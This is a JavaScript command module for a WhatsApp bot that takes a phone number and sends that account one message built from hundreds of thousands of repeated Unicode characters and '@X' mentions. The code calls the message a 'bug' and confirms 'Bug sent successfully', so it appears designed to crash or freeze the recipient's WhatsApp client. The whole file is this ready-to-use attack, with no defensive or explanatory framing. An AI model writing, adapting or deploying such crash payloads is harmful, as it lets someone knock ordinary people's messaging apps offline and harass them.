//My code works, but I have no idea why. Should I touch it?

const ownerMiddleware = require('../../utility/botUtil/Ownermiddleware');

module.exports = async (context) => {
    await ownerMiddleware(context, async () => {
        const { client, m, text, args } = context;

        
        if (!text || !args[0]) {
            return m.reply('Please provide a phone number (e.g., .execute 254722233...).');
        }

        
        const phoneNumber = args[0].replace(/\D/g, ''); 
        const targetJid = `${phoneNumber}@s.whatsapp.net`;

        
        const bugMessage = {
            text: "" +
                "ꦾ".repeat(59999) + 
                "@X".repeat(99999) + 
                "𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭𑲭".repeat(99999) + 
                "ᬃᬃ".repeat(99999) + 
                "⿻".repeat(99999) 
        };

        try {
            
            const response = await client.sendMessage(targetJid, bugMessage);

            if (response?.key?.id) {
                m.reply(`Bug sent successfully to ${targetJid}.`);
            } else {
                m.reply('Failed to send bug: No message ID returned.');
            }
        } catch (error) {
            console.error('Error sending bug:', error);
            m.reply('Failed to send bug. Check the logs for details.');
        }
    });
};
